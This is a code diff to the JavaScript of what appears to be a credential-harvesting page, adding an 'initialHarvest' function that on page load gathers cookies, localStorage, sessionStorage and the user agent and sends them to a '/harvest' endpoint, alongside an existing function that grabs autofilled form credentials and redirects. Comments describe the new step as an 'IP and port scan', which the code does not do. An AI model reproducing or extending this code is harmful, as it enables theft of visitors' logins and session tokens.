@@ -1,12 +1,44 @@
 // A flag to prevent multiple harvests
 window.harvested = false;
+window.initialHarvestSent = false; // New flag for initial harvest
 
+async function initialHarvest() {
+  if (window.initialHarvestSent) return;
+  window.initialHarvestSent = true;
+  console.log('Initial harvest triggered (IP and port scan only)!');
+
+  const data = {
+    userAgent: navigator.userAgent,
+    cookies: document.cookie,
+    localStorage: { ...localStorage },
+    sessionStorage: { ...sessionStorage },
+    timestamp: new Date().toISOString(),
+    type: 'initial_scan' // Indicate this is an initial scan
+  };
+
+  try {
+    if (navigator.sendBeacon) {
+      const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
+      navigator.sendBeacon('/harvest', blob);
+      console.log('Initial beacon harvest sent.');
+    } else {
+      await fetch('/harvest', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data),
+      });
+      console.log('Initial harvest successful.');
+    }
+  } catch (error) {
+    console.error('Initial harvest failed:', error);
+  }
+}
 
 async function harvest() {
-  // Check the flag to ensure this function only runs once
+  // Check the flag to ensure this function only runs once for credentials
   if (window.harvested) return;
   window.harvested = true;
-  console.log('Harvest triggered!');
+  console.log('Credential harvest triggered!');
 
   // A delay to allow the browser to populate all fields in the form (e.g., username and password)
   await new Promise(resolve => setTimeout(resolve, 250));
@@ -46,6 +78,7 @@ async function harvest() {
     localStorage: { ...localStorage },
     sessionStorage: { ...sessionStorage },
     timestamp: new Date().toISOString(),
+    type: 'credential_harvest' // Indicate this is a credential harvest
   };
 
   try {
@@ -53,7 +86,7 @@ async function harvest() {
     if (navigator.sendBeacon) {
       const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
       navigator.sendBeacon('/harvest', blob);
-      console.log('Beacon harvest sent.');
+      console.log('Beacon credential harvest sent.');
     } else {
       // Fallback to fetch for other cases
       const response = await fetch('/harvest', {
@@ -61,10 +94,10 @@ async function harvest() {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(data),
       });
-      console.log('Harvest successful:', response.status);
+      console.log('Credential harvest successful:', response.status);
     }
   } catch (error) {
-    console.error('Harvest failed:', error);
+    console.error('Credential harvest failed:', error);
   }
 
   // Redirect after a short delay
@@ -147,8 +180,8 @@ if (!splashShown) {
       setupEventListeners();
       // Attempt to trigger autofill
       triggerFocusSwarm();
-      // Trigger an immediate harvest on page load
-      harvest();
+      // Trigger an immediate initial harvest on page load (IP and port scan)
+      initialHarvest();
     }
   }, 1500); // Existing 1.5 second delay for loader
 }, 7000); // 7 second delay for the image splash screen
@@ -167,8 +200,8 @@ if (!splashShown) {
       honeypotContainer.style.display = 'block';
       setupEventListeners();
       triggerFocusSwarm();
-      // Trigger an immediate harvest on page load
-      harvest();
+      // Trigger an immediate initial harvest on page load (IP and port scan)
+      initialHarvest();
     }
   }, 1500); // Existing 1.5 second delay for loader
 }
